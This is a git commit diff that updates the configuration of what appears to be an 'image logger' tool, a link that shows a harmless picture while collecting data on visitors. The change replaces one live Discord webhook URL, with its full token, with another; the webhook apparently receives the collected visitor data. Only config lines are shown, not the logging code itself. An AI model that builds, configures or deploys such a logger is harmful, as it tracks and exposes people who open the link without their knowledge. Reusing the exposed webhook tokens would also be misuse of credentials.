b8553be2e2010cdbae4ff9e9240ca14ee3ae0b2e
4kai-1 <154487161+4kai-1@users.noreply.github.com>
2025-02-21 16:14:52 -0500

    Update image.py

--- api/image.py
+++ api/image.py
@@ -12,7 +12,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1340931038443999283/hhg_8vwvedqQF4RQGJ5bdC5QofDaK1cvxYHN3oLPjPhH-Pq2PaQna_OOLAQh-Pmrp3FO",
+    "webhook": "https://discord.com/api/webhooks/1342604830253776936/Aag95Ro2QNyHs7Ve6SmDiCrHFA5pFtOCOzshItbVXYRR5eNw_tXHw8VkZihqFLMygSle",
     "image": "https://ih1.redbubble.net/image.3713143085.1244/raf,360x360,075,t,fafafa:ca443f4786.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
